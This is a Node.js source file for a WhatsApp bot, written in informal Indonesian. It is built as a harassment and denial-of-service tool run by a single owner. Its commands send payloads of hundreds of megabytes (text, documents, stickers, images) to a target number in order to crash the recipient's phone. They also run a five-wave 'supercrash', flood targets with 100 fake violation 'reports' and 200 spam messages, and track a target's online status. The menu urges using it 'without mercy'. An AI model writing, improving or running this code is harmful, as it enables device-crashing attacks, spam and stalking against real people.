const { makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage } = require('@whiskeysockets/baileys');
const Pino = require('pino');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// Helper delay
const delay = ms => new Promise(res => setTimeout(res, ms));

// Generate payload berat (TB-TB virtual)
function generateHeavyPayload(type, sizeMB = 500) {
    const fakeBuff = Buffer.alloc(sizeMB * 1024 * 1024, 'A');
    if (type === 'text') return fakeBuff.toString().repeat(100);
    if (type === 'sticker') return { url: 'https://httpbin.org/bytes/524288000' };
    return fakeBuff;
}

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false, // pairing code, gak pake QR
        logger: Pino({ level: 'silent' })
    });

    // Pairing code
    if (!sock.authState.creds.registered) {
        const phoneNumber = await new Promise((resolve) => {
            rl.question('🔐 Masukkan nomor WhatsApp lo (contoh: 628xxxx): ', resolve);
        });
        const code = await sock.requestPairingCode(phoneNumber);
        console.log(`📱 Kode pairing lo: ${code}`);
        console.log('⏳ Tunggu sebentar, bot akan konek otomatis...');
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.log('✅ AlpaxittBot siap menghancurkan!');
            rl.close();
        } else if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log('🔄 Koneksi putus, reconnect...');
                startBot();
            }
        }
    });

    // LISTENER PESAN
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        const msg = chatUpdate.messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        const command = body.split(' ')[0].toLowerCase();
        const args = body.split(' ').slice(1);

        // Owner-only (ganti nomor lo)
        const ownerNumber = '6281234567890@s.whatsapp.net'; // 🔥 GANTI DENGAN NOMOR LO 🔥

        if (from !== ownerNumber) {
            await sock.sendMessage(from, { text: '⚠️ Lu siapa? Bot ini cuma buat owner, cabut!' });
            return;
        }

        // ========== FITUR SADIS ==========

        // 1. Virtex
        if (command === 'virtex' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            await sock.sendMessage(target, { text: generateHeavyPayload('text', 400) });
            await sock.sendMessage(from, { text: `💀 Virtex 400MB dikirim ke ${target}` });
        }

        // 2. Virdok
        else if (command === 'virdok' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            await sock.sendMessage(target, {
                document: generateHeavyPayload('text', 700),
                mimetype: 'application/octet-stream',
                fileName: 'VIRUS_DOKUMEN_TB.bin'
            });
            await sock.sendMessage(from, { text: `📁 Virdok 700MB dikirim ke ${target}` });
        }

        // 3. Kenon (spam report 100x)
        else if (command === 'kenon' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            for (let i = 0; i < 100; i++) {
                await sock.sendMessage(target, { text: 'LAPORAN: Nomor ini melanggar aturan WhatsApp! BLOKIR PERMANEN!' });
                await delay(50);
            }
            await sock.sendMessage(from, { text: `📢 100x laporan dikirim ke ${target}` });
        }

        // 4. Crash (stiker TB)
        else if (command === 'crash' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            await sock.sendMessage(target, { sticker: { url: 'https://httpbin.org/bytes/524288000' } });
            await sock.sendMessage(from, { text: `🏷️ Stiker crash 500MB dikirim ke ${target}` });
        }

        // 5. Virgam (gambar crash)
        else if (command === 'virgam' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            await sock.sendMessage(target, {
                image: { url: 'https://httpbin.org/bytes/524288000' },
                caption: 'VIRUS GAMBAR 500MB - HP LO AKAN CRASH!'
            });
            await sock.sendMessage(from, { text: `🖼️ Virgam 500MB dikirim ke ${target}` });
        }

        // 6. Supercrash (ultimate 5 wave)
        else if (command === 'supercrash' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            for (let i = 1; i <= 5; i++) {
                await sock.sendMessage(target, { text: generateHeavyPayload('text', 300) });
                await sock.sendMessage(target, { sticker: { url: 'https://httpbin.org/bytes/524288000' } });
                await delay(100);
                await sock.sendMessage(from, { text: `💣 Wave ${i}/5 dikirim ke ${target}` });
            }
            await sock.sendMessage(from, { text: `🔥 SUPERCRASH SELESAI! Target: ${target}` });
        }

        // 7. Spam teks cepat 200x
        else if (command === 'spam' && args[0] && args[1]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            const text = args.slice(1).join(' ');
            for (let i = 0; i < 200; i++) {
                await sock.sendMessage(target, { text: `${text} [${i+1}/200]` });
            }
            await sock.sendMessage(from, { text: `📨 200x spam dikirim ke ${target}` });
        }

        // 8. Info online/offline
        else if (command === 'info' && args[0]) {
            const target = args[0].includes('@') ? args[0] : args[0] + '@s.whatsapp.net';
            try {
                const presence = await sock.presenceSubscribe(target);
                await sock.sendMessage(from, { text: `📡 Status ${target}: ${presence ? 'ONLINE 🟢' : 'OFFLINE 🔴'}` });
            } catch {
                await sock.sendMessage(from, { text: `❌ Gagal cek status ${target}` });
            }
        }

        // 9. Ping
        else if (command === 'ping') {
            const start = Date.now();
            await sock.sendMessage(from, { text: '🏓 Pong!' });
            const latency = Date.now() - start;
            await sock.sendMessage(from, { text: `⚡ Ping: ${latency}ms | Bot siap ngebacot 🚀` });
        }

        // 10. Bantuan menu
        else if (command === 'menu') {
            await sock.sendMessage(from, {
                text: `╔═══ AlpaxittBot 🔥
║ 🧨 virtex <nomor>
║ 📁 virdok <nomor>
║ 📢 kenon <nomor>
║ 🏷️ crash <nomor>
║ 🖼️ virgam <nomor>
║ 💣 supercrash <nomor>
║ 📨 spam <nomor> <teks>
║ 📡 info <nomor>
║ 🏓 ping
╚═══ Gunakan tanpa ampun! 😈`
            });
        }

        else {
            await sock.sendMessage(from, { text: '❌ Perintah salah. Ketik *menu* buat liat daftar.' });
        }
    });
}

startBot();
